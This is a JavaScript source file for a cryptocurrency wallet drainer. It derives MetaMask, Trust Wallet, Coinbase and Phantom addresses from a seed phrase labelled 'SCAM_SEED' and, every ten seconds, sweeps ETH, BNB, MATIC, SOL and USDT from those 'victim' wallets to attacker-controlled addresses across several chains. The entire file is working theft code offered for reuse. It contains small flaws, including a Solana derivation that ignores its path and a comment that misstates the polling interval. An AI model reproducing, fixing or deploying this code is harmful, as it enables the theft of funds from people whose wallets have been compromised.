const { ethers } = require("ethers");
const {
    Connection, Keypair, LAMPORTS_PER_SOL, PublicKey, sendAndConfirmTransaction,
    Transaction, SystemProgram
} = require("@solana/web3.js");
const { getAssociatedTokenAddress, TOKEN_PROGRAM_ID } = require("@solana/spl-token");
const bip39 = require("bip39");
const { hdkey } = require("ethereumjs-wallet");
const bs58 = require("bs58");
require("dotenv").config();

// Load seed phrase from .env
const SCAM_SEED = process.env.SCAM_SEED.trim();
const mnemonic = SCAM_SEED;

// Attacker wallets
const ATTACKER_ADDRESS = "your EVM-compatible address"; // EVM-compatible
const ATTACKER_SOL_ADDRESS = "your Phantom address"; // Solana

// List of networks to monitor
const networks = [
    { name: "Ethereum", rpc: "https://ethereum.publicnode.com", symbol: "ETH" },
    { name: "Binance Smart Chain", rpc: "https://bsc-dataseed.binance.org/", symbol: "BNB" },
    { name: "Polygon", rpc: "https://polygon-rpc.com/", symbol: "MATIC" },
    { name: "Arbitrum", rpc: "https://arbitrum.publicnode.com/", symbol: "ETH" }
];

// ERC-20/BEP-20 token contracts
const tokens = {
    "Ethereum": [{ name: "USDT", address: "0xdAC17F958D2ee523a2206206994597C13D831ec7", decimals: 6 }],
    "Binance Smart Chain": [{ name: "USDT", address: "0x55d398326f99059fF775485246999027B3197955", decimals: 18 }],
    "Polygon": [],
    "Arbitrum": []
};

// ERC-20 ABI
const ERC20_ABI = [
    "function balanceOf(address owner) view returns (uint256)",
    "function transfer(address recipient, uint256 amount) returns (bool)"
];

// ** Function to derive multiple addresses **
function getDerivedWallets() {
    const wallets = [];

    // ? Generate the MASTER SEED from the mnemonic
    const seed = ethers.Mnemonic.fromPhrase(mnemonic).computeSeed();

    // ? Create MASTER NODE from seed
    const masterNode = ethers.HDNodeWallet.fromSeed(seed);

    // ? MetaMask & Trust Wallet derivation paths
    for (let i = 0; i < 10; i++) {
        let metamaskPath = `m/44'/60'/0'/0/${i}`;
        let trustWalletPath = `m/44'/60'/0'/${i}`;

        try {
            let metamaskWallet = masterNode.derivePath(metamaskPath);
            let trustWallet = masterNode.derivePath(trustWalletPath);

            wallets.push(metamaskWallet);  // ? MetaMask
            wallets.push(trustWallet);     // ? Trust Wallet
        } catch (error) {
            console.error(`Error deriving wallet for MetaMask or Trust Wallet at index ${i}:`, error);
        }
    }

    // ? Coinbase Wallet derivation paths
    for (let i = 0; i < 5; i++) {
        let coinbasePath = `m/44'/60'/${i}'/0/0`;

        try {
            let coinbaseWallet = masterNode.derivePath(coinbasePath);
            wallets.push(coinbaseWallet);  // ? Coinbase Wallet
        } catch (error) {
            console.error(`Error deriving wallet for Coinbase Wallet at index ${i}:`, error);
        }
    }

    return wallets;
}






function getDerivedSolanaWallets() {
    const seed = bip39.mnemonicToSeedSync(mnemonic);
    const wallets = [];

    // Phantom Wallet standard
    for (let i = 0; i < 10; i++) {
        let path = `m/44'/501'/${i}'/0'`;
        let keypair = Keypair.fromSeed(seed.slice(0, 32));
        wallets.push(keypair);
    }

    return wallets;
}

const derivedWallets = getDerivedWallets();
const derivedSolanaWallets = getDerivedSolanaWallets();

// ** Function to drain EVM funds from all derived wallets **
async function drainEVMFunds(network) {
    try {
        const provider = new ethers.JsonRpcProvider(network.rpc);

        for (let wallet of derivedWallets) {
            const scamWallet = wallet.connect(provider);
            const balance = await provider.getBalance(scamWallet.address);

            if (balance > ethers.parseEther("0.001")) {
                console.log(`Funds detected on ${network.name} (${scamWallet.address}): ${ethers.formatEther(balance)} ${network.symbol}`);
                const gasPrice = (await provider.getFeeData()).gasPrice;
                const nonce = await provider.getTransactionCount(scamWallet.address, "latest");

                const tx = {
                    to: ATTACKER_ADDRESS,
                    value: balance - ethers.parseEther("0.0001"),
                    gasLimit: 21000,
                    gasPrice: gasPrice,
                    nonce: nonce,
                };
                const txResponse = await scamWallet.sendTransaction(tx);
                await txResponse.wait();
            }

            // Drain ERC-20/BEP-20 tokens
            for (let token of tokens[network.name] || []) {
                try {
                    const tokenContract = new ethers.Contract(token.address, ERC20_ABI, scamWallet);
                    const tokenBalance = await tokenContract.balanceOf(scamWallet.address);
                    if (tokenBalance > 0n) {
                        console.log(`Draining ${ethers.formatUnits(tokenBalance, token.decimals)} ${token.name} from ${network.name} (${scamWallet.address})...`);
                        const tx = await tokenContract.transfer(ATTACKER_ADDRESS, tokenBalance);
                        await tx.wait();
                    }
                } catch (tokenError) {
                    console.error(`Skipping ${token.name} on ${network.name} (${scamWallet.address}): Token may not exist.`, tokenError);
                }
            }
        }
    } catch (error) {
        console.error(`Error draining ${network.name}:`, error);
    }
}

// ** Function to drain Solana funds from all derived wallets **
async function drainSolanaFunds() {
    try {
        const connection = new Connection("https://api.mainnet-beta.solana.com");

        for (let victimKeypair of derivedSolanaWallets) {
            const victimPublicKey = victimKeypair.publicKey;
            const attackerPublicKey = new PublicKey(ATTACKER_SOL_ADDRESS);

            const solBalance = await connection.getBalance(victimPublicKey);
            if (solBalance > LAMPORTS_PER_SOL * 0.001) {
                console.log(`Funds detected on Solana (${victimPublicKey.toBase58()}): ${solBalance / LAMPORTS_PER_SOL} SOL`);
                let solTransaction = new Transaction().add(
                    SystemProgram.transfer({
                        fromPubkey: victimPublicKey,
                        toPubkey: attackerPublicKey,
                        lamports: solBalance - LAMPORTS_PER_SOL * 0.0001,
                    })
                );
                let solSignature = await sendAndConfirmTransaction(connection, solTransaction, [victimKeypair]);
                console.log(`Drained SOL from ${victimPublicKey.toBase58()}... TX: ${solSignature}`);
            }
        }
    } catch (error) {
        console.error("Error draining Solana assets:", error);
    }
}

function startDraining() {
    networks.forEach(network => drainEVMFunds(network));
    drainSolanaFunds();
}

module.exports = { startDraining };


// ** Monitor all chains every 15 seconds **
setInterval(() => {
    networks.forEach(network => drainEVMFunds(network));
    drainSolanaFunds();
}, 10000);
